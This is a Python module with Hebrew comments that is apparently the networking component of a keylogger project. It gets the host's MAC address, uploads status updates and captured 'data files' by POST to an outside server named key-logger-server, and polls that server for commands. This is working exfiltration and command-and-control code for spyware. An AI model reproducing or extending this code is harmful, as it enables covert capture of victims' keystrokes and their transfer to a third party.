from abc import ABC, abstractmethod
import requests
import json
import uuid

mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))


class APIServer(ABC):
    """
    מחלקה אבסטרקטית לייצוג שרת API.
    כל מחלקה היורשת ממנה חייבת לממש את המתודה 'interact_with_server'.
    """

    @abstractmethod
    def interact_with_server(self, *args, **kwargs):
        pass


class StatusUpdater(APIServer):
    """
    שולח בקשת POST לעדכון סטטוס הפרויקט.
    """

    def interact_with_server(self, status_data):

        url = "https://key-logger-server.onrender.com/api/status/update"
        try:
            response = requests.post(url, json=status_data)
            response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
            print(f"------------ הודעה נשלחה בהצלחה ----------------\n {status_data}")
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון סטטוס: {e}")
            return None


class DataFileWriter(APIServer):
    """
    שולח בקשת POST לעדכון קובץ דאטא של מחשב ספציפי לפי כתובת MAC.
    """

    def interact_with_server(self, file_data, mac_address=mac_address):

        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
        try:
            response = requests.post(url, json=file_data, headers={"mac-address": mac_address})
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון קובץ דאטא עבור MAC {mac_address}: {e}")
            return None


class StatusChecker(APIServer):
    """
    שולח בקשת GET כדי לדעת האם יש שינויים בסטטוסים.
    """

    def interact_with_server(self):
        """
        שולח בקשת GET לבדיקת שינויים בסטטוסים.

        :return: תגובת השרת (requests.Response).
        """
        url = "https://key-logger-server.onrender.com/api/status/check"  # החלף בכתובת ה-URL האמיתית
        try:
            # הנחת עבודה שיש self.mac_address השמור במחלקה / באובייקט.
            # אם אין, ניתן להגדיר משתנה mac_address באופן אחר.
            headers = {"mac-address": mac_address}

            # שליחת בקשה GET לשרת עם ההדר שמכיל את ה-MAC
            response = requests.get(url, headers=headers)

            # raise_for_status מוודא שלא חזר קוד תקלה (4XX או 5XX);
            # במידה ויש שגיאה תיזרק החרגה
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בבדיקת שינויי סטטוס: {e}")
            return None


class RequestManager:
    """
    מנהל את הבקשות ומנתב אותן למחלקה המתאימה בהתאם למטודה וסוג הבקשה.
    """

    def __init__(self):
        self.status_updater = StatusUpdater()
        self.data_file_writer = DataFileWriter()
        self.status_checker = StatusChecker()

    def handle_request(self, method, request_type, kwargs=None):
        """
        מטפל בבקשה ומנתב אותה למחלקה המתאימה.

        :param method: שיטת הבקשה ('GET' או 'POST').
        :param request_type: סוג הבקשה ('status', 'data', 'dag').
        :param kwargs: ארגומנטים נוספים שיעברו למתודת 'interact_with_server'.
        :return: תגובת השרת או None במקרה של שגיאה.
        :raises ValueError: אם סוג בקשה לא חוקי.
        """
        if method.upper() == 'POST':
            if request_type == 'status':
                return self.status_updater.interact_with_server(kwargs)
            elif request_type == 'data':
                return self.data_file_writer.interact_with_server(kwargs)
            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור POST: {request_type}")
        elif method.upper() == 'GET':
            if request_type == 'status':
                return self.status_checker.interact_with_server()

            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור GET: {request_type}")
        else:
            raise ValueError(f"שיטת בקשה לא חוקית: {method}")
